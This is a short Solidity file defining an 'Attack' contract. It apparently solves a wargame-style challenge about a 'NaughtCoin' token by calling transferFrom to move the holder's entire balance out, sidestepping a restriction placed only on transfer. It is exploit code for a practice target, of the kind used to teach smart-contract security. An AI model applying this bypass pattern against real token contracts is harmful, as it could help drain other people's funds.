pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    function send_em(address me, address _token) public {
        NaughtCoin coin = NaughtCoin(_token);
        coin.transferFrom(me, address(this), coin.balanceOf(me));
    }
}
